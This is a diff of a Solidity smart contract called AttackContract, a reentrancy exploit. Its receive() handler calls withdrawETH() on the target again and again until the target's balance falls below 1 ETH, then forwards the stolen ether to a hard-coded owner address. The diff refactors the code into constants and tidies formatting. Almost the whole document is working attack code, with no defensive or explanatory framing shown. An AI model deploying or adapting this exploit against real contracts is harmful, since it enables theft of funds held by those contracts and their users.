@@ -1,4 +1,4 @@
-// SPDX-License-Identifier: MIT 
+// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
 interface IReentrancyVulnerable {
@@ -7,13 +7,10 @@ interface IReentrancyVulnerable {
 }
 
 contract AttackContract {
-    IReentrancyVulnerable public vulnerableContract;
-    address payable owner;
-
-    constructor() {
-        owner = payable(msg.sender);
-        vulnerableContract = IReentrancyVulnerable(0x7a46e70000000000000000000000000000000000);
-    }
+    IReentrancyVulnerable public constant vulnerableContract =
+        IReentrancyVulnerable(0x7a46e70000000000000000000000000000000000);
+    address payable constant owner =
+        payable(0xCa11e40000000000000000000000000000000000);
 
     function attack(uint256 amount) external payable {
         vulnerableContract.depositETH{value: amount}();
@@ -22,12 +19,12 @@ contract AttackContract {
 
     receive() external payable {
         // 1 ETH
-        if (address(vulnerableContract).balance >= 1 ether){
+        if (address(vulnerableContract).balance >= 1 ether) {
             vulnerableContract.withdrawETH();
         } else {
             payable(owner).transfer(address(this).balance);
         }
     }
-    
-    fallback() external payable { }
+
+    fallback() external payable {}
 }
